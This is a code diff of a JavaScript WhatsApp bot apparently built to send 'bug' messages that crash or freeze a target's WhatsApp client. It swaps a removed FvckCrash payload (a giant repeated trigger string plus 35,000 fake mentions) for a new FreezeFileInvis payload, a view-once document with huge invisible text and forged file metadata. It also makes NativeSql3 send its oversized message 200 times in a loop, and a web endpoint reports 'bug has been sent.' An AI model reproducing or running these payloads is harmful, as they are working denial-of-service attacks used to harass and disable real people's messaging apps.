@@ -67,7 +67,6 @@ async function ai(prompt) {
 const activeSockets = new Map();
 async function ensureSocketForNumber(phoneNumber) {
   const pn = String(phoneNumber).replace(/[^0-9]/g, "");
-  // kalau sudah ada socket aktif yang valid, return
   if (activeSockets.has(pn)) {
     const info = activeSockets.get(pn);
     if (info && info.sock) return info.sock;
@@ -137,10 +136,14 @@ const { imageMessage } = await generateWAMessageContent({ image: { url },}, {
     if (!msg.message) return;
     const body = msg.message.conversation || msg.message.extendedTextMessage?.text;
     if (!body) return;
-    const from = msg.key.remoteJid; 
-    const isGroup = from.endsWith("@g.us"); 
+    const from = msg.key.remoteJid;
+    const isGroup = from.endsWith("@g.us");
     const sender = msg.key.participant || msg.key.remoteJid;
-    const isBot = msg.key.fromMe; 
+    const isBot = msg.key.fromMe;
+    const meJid = sock?.user?.id || null;
+    if (!(msg.key.fromMe === true || sender === meJid || sender === (meJid + "@s.whatsapp.net"))) {
+      return; 
+    }
     const prefixes = [".", "!", "#", "/", " "];
     const usedPrefix = prefixes.find(p => body.startsWith(p));
     if (!usedPrefix) return;
@@ -186,7 +189,7 @@ let mg = generateWAMessageFromContent(from,
             text: `Notification!`
           },
           footer: {
-            text: `whyuxD`
+            text: ``
           },
           carouselMessage: {
             cards: [
@@ -358,7 +361,7 @@ for (let iter = 1; iter <= 100; iter++) {
               contextInfo: {
                 participant: target,
                 mentionedJid: ["13135550202@s.whatsapp.net", ...Array.from({ length: 1999 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)],
-                remoteJid: "7eppeliiiiiiii", 
+                remoteJid: "wxx", 
                 stanzaId: "123",
                 quotedMessage: {
                 paymentInviteMessage: {
@@ -386,51 +389,12 @@ for (let iter = 1; iter <= 100; iter++) {
  }
 }
 
-async function FvckCrash(target, ptcp = true) {   
-    const trigger = "𑇂wxx1𑆵𑆴𑆿".repeat(60000);
-    const mentionedList = [
-        target,
-        ...Array.from({ length: 35000 }, () =>
-            `${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
-        )
-    ];    
-    try {
-        const message = {
-            botInvokeMessage: {
-                message: {
-                    newsletterAdminInviteMessage: {
-                        newsletterJid: '1@newsletter',
-                        newsletterName: trigger,
-                        jpegThumbnail: null,
-                        caption: trigger,
-                        inviteExpiration: 9999999999999,
-                    },
-                },
-            },
-            nativeFlowMessage: {},
-            contextInfo: {
-                remoteJid: target,
-                participant: target,
-                mentionedJid: mentionedList,
-                disappearingMode: {
-                    initiator: "CHANGED_IN_CHAT",
-                    trigger: "CHAT_SETTING"
-                }
-            },
-        };
-        await sock.relayMessage(target, message, {
-            userJid: target,
-        });
-    } catch (error) {
-        console.log("error:\n" + error);
-    }
-}
-
 async function NativeSql3(target) {
+for (let iter = 1; iter <= 200; iter++) {
   let msg = {
     interactiveMessage: {
       body: {
-        text: "¿w𝑿𝑿1 ꆜ " + "ꦾ".repeat(73000)
+        text: "¿𝑿𝑿1 ꆜ " + "ꦾ".repeat(73000)
       },
       nativeFlowMessage: {
         buttons: [
@@ -451,6 +415,41 @@ async function NativeSql3(target) {
     participant: { jid: target },
     userJid: target
   });
+ }
+}
+
+async function FreezeFileInvis(target, Ptcp = true) {
+    let anjays = "x" + "ြ".repeat(25000) + "@1".repeat(60000);
+    await sock.relayMessage(target, {
+            message: {
+                ViewOnceMessage: {
+                    message: {
+                        documentMessage: {
+                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
+                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
+                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+                            fileLength: "999999999",
+                            pageCount: 0x9184e729fff,
+                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+                            fileName: "NtahMengapa..",
+                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
+                            mediaKeyTimestamp: "1715880173",
+                            contactVcard: true
+                        },
+                        title: "hytam vs putyh",
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: anjays
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+               mentionedJid: Array.from({ length: 5 }, () => "status@broadcast")
+            }
+          }
+        }
+    }, { participant: { jid: mentionedJid, target } }, { messageId: null });
 }
 
 // ###################### //
@@ -464,7 +463,7 @@ async function NativeSql3(target) {
       await NativeSql3(jid)
       return res.json({ success: true, message: "Bug telah dikirim" });
     } else if (type === "bug_c") {
-      await FvckCrash(jid); 
+      await FreezeFileInvis(jid)
       return res.json({ success: true, message: "Bug telah dikirim" });
     } else if (type === "bug_d") {
       
